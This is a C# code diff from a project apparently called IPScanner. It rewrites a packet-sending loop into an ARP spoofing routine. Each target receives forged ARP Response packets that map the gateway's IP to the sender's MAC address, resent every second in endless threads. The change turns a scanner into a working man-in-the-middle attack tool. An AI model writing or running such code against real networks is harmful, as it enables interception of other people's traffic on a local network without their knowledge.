@@ -80,8 +80,12 @@ namespace IPScanner.Services.Imples
                 foreach (var target in this.targetlist)
                 {
 
-                    ARPPacket arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), target.Key, this.currentDevice.MacAddress, ipV4);
-                    EthernetPacket ethernetpacketforgatewayrequest = new EthernetPacket(this.currentDevice.MacAddress, gatewayMac, EthernetPacketType.Arp);
+                    // ARPPacket arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayIp, this.currentDevice.MacAddress, target.Key);
+                    ARPPacket arppacketforgatewayrequest = new ARPPacket(ARPOperation.Response, target.Value, target.Key, this.currentDevice.MacAddress, gatewayIp);
+
+                    //EthernetPacket ethernetpacketforgatewayrequest = new EthernetPacket(this.currentDevice.MacAddress, gatewayMac, EthernetPacketType.Arp);
+                    EthernetPacket ethernetpacketforgatewayrequest = new EthernetPacket(this.currentDevice.MacAddress, target.Value, EthernetPacketType.Arp);
+
                     ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
 
                     this.arpSproofThreads.Add(new Thread(() =>
@@ -91,7 +95,8 @@ namespace IPScanner.Services.Imples
                             while (true)
                             {
                                 this.currentDevice.SendPacket(ethernetpacketforgatewayrequest);
-                                Thread.Sleep(500);
+                                Thread.Sleep(1000);
+                                // Console.WriteLine("ARP Sproofing...");
                             }
                         }
                         catch (PcapException ex)
